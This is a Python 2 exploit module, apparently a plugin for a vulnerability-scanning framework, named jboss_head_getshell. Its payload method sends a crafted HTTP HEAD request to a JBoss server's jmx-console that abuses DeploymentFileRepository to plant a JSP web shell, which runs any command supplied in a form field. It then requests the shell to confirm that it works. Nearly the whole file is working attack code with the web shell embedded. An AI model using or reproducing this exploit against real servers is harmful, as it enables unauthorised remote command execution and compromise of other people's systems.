#! /usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys

#模块使用说明
docs = '''

#==============================================================================
#title                  :jboss_head_getshell
#description            :jboss
#author                 :mosin
#date                   :20170901
#version                :0.1
#notes                  :
#python_version         :2.7.5
#==============================================================================

'''

from modules.exploit import BGExploit



class PLScan(BGExploit):
    
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "jboss_head_getshell",  # 该POC的名称
            "product": "jboss",  # 该POC所针对的应用名称,
            "product_version": "1.0",  # 应用的版本号
            "desc": '''
            Jboss Http Getshell

            ''',  # 该POC的描述
            "author": ["mosin"],  # 编写POC者
            "ref": [
                {self.ref.url: ""},  # 引用的url
                {self.ref.bugfrom: ""},  # 漏洞出处
            ],
            "type": self.type.rce,  # 漏洞类型
            "severity": self.severity.high,  # 漏洞等级
            "privileged": False,  # 是否需要登录
            "disclosure_date": "2017-05-17",  # 漏洞公开时间
            "create_date": "2017-09-1",  # POC 创建时间
        }

        #自定义显示参数
        self.register_option({
            "target": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "目标IP",
                "Required":"no"
            },
            "port": {
                "default": "",
                "convert": self.convert.int_field,
                "desc": "目标端口",
                "Required":"no"
            },
            "debug": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "用于调试，排查poc中的问题",
                "Required":""
            },
            "mode": {
                "default": "payload",
                "convert": self.convert.str_field,
                "desc": "执行exploit,或者执行payload",
                "Required":""
            },
            "timeout": {
                "default": 10,
                "convert": self.convert.int_field,
                "desc": "连接超时时间",
                "Required":"no"
            }
        })
        
        #自定义返回内容
        self.register_result({
            #检测标志位，成功返回置为True,失败返回False
            "status": False,
            "exp_status":False, #exploit，攻击标志位，成功返回置为True,失败返回False
            #定义返回的数据，用于打印获取到的信息
            "data": {
                "infos":""
            },
            #程序返回信息
            "description": "",
            "error": "程序执行出错"
        })
        
    def random_str(self,len): 
        str1="" 
        for i in range(len): 
            str1+=(random.choice("ABCDEFGH")) 
        return str1


    def payload(self):
        import socket
        import time
        import random
        import urllib2
        host = self.option.target['default']
        port = self.option.port['default']
        timeout = self.option.timeout['default']
        try:
            socket.setdefaulttimeout(timeout)
            s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s1.connect((host,port))
            shell="""<%@ page import="java.util.*,java.io.*"%> <% %> <HTML><BODY> <FORM METHOD="GET" NAME="comments" ACTION=""> <INPUT TYPE="text" NAME="comment"> <INPUT TYPE="submit" VALUE="Send"> </FORM> <pre> <% if (request.getParameter("comment") != null) { out.println("Command: " + request.getParameter("comment") + "<BR>"); Process p = Runtime.getRuntime().exec(request.getParameter("comment")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> </pre> </BODY></HTML>"""
            #s1.recv(1024)        
            shellcode = ""
            name = self.random_str(5)
            for v in shell:
                shellcode += hex(ord(v)).replace("0x","%")
            flag = "HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType="+\
            "java.lang.String&arg0=%s.war&argType=java.lang.String&arg1=auto700&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3="%(name)+shellcode+\
            "&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
            s1.send(flag)
            data = s1.recv(512)
            s1.close()
            time.sleep(10)
            url = "http://%s:%d"%(host,port)
            webshell_url = "%s/%s/auto700.jsp"%(url,name)
            res = urllib2.urlopen(webshell_url,timeout = timeout)
            if 'comments' in res.read():
                info = "Jboss Authentication bypass webshell:%s"%(webshell_url)
                self.result.data['infos'] = info
                self.result.status = True
        except Exception,e:
            print self.result.error

    def exploit(self):
        """
        攻击类型
        :return:
        """
        pass


#下面为单框架程序执行，可以省略
if __name__ == '__main__':
    from main import main
    main(PLScan())
